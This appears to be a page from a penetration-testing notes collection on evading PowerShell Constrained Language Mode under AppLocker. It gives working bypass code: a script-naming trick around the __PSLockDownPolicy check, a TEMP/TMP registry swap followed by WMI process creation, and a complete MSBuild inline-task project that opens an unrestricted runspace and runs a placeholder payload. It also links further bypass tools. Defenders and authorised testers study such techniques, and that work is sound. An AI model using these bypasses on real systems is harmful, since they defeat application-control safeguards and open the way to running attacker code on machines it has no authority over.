---
title: CLM
---

When AppLocker is enabled *Constrained Language Mode* is activated in PowerShell.

Check if CLM is enabled.

~~~ powershell
$ExecutionContext.SessionState.LanguageMode
~~~

Evade CLM if enabled trough the `$__PSLockDownPolicy` environment variable ([source](http://web.archive.org/web/20220929061634/https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/)).

~~~ ps1
$__PSLockDownPolicy
echo 'echo $ExecutionContext.SessionState.LanguageMode;PAYLOAD' > .\system32.ps1
.\system32.ps1
~~~

If AppLocker allows script execution from a writable directory, CLM can be bypassed by modifying the `%TEMP%` and `%TMP%` environment variables ([source](https://web.archive.org/web/20230326030856/https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/)).
In the example AppLocker allows script execution from `C:\Windows\Temp`.

~~~ ps1
$orgtemp = $env:temp
$orgtmp = $env:tmp
$newtmp = 'C:\Windows\Temp'

Set-ItemProperty -Path 'HKCU:\Environment' -Name Tmp -Value $newtmp
Set-ItemProperty -Path 'HKCU:\Environment' -Name Temp -Value $newtmp

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList powershell.exe

sleep 1

Set-ItemProperty -Path 'HKCU:\Environment' -Name Tmp -Value $orgtmp
Set-ItemProperty -Path 'HKCU:\Environment' -Name Temp -Value $orgtemp
~~~

CLM does not apply to custom runspaces.
You can create a runspace if you can get an executable or DLL past AppLocker ([source](http://web.archive.org/web/20221123103200/https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/)).

~~~ ps1
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\runspace.csproj
~~~

`./runspace.csproj` ([source](https://github.com/minatotw/clmbypassblogpost/)):

~~~ xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
    <MSBuildTest/>
  </Target>
  <UsingTask TaskName="MSBuildTest" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Linq;
          using System.Management.Automation;
          using System.Management.Automation.Runspaces;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class MSBuildTest : Task, ITask {
            public override bool Execute() {
              using (var runspace = RunspaceFactory.CreateRunspace()) {
                using (var posh = PowerShell.Create()) {
                  runspace.Open();
                  posh.Runspace = runspace;
                  posh.AddScript("$ExecutionContext.SessionState.LanguageMode;PAYLOAD");
                  var results = posh.Invoke();
                  var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                  Console.WriteLine(output);
                }
              }
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
~~~

Other tools:

- [PowerShdll](https://github.com/p3nt4/powershdll), DLL that starts PowerShell in custom runspace

References:

- [Bypass-CLM.ps1](https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/red-teaming/Bypass-ConstrainedLanguageMode), bypass CLM via COM
